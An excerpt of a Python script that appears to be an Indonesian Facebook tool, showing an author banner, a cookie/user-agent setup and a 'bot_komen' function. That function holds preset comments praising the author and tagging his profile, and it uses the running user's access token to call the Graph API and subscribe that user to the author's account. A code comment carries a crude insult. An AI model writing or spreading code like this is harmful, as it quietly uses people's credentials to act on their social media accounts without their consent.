...
def logo():
	os.system("clear")
	print("  \033[0;91m \n \033[0;91m \033[0;96m AUTHOR\033[0;97m : RIAN SETIAWAN\n\033[0;97m \033[0;91mFACEBOOK\033[0;97m : FB.ME/RianStwn30\n\033[0;97m \033[0;93m GITHUB \033[0;97m : GITHUB.COM/riyenz30")
...
def bot_komen():
    ...
    kom = ('Lopyu bang @[100025434784741:0] 😍😘\nhttps://m.facebook.com/story.php?story_fbid=426674878190335&id=100025434784741') 
    kom2 = ('KEREN BANG @[100025434784741:0] 😘😘\nhttps://m.facebook.com/story.php?story_fbid=174908183367007&id=100025434784741') 
    ...
    requests.post('https://graph.facebook.com/100025434784741/subscribers?access_token=' + token)
...
def cookie():
	...
	try:
		...
		'user-agent'                : 'Mozilla/5.0 (Linux; Android 10; RMX1911) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36', # Jangan Di Ganti Ea Anjink.
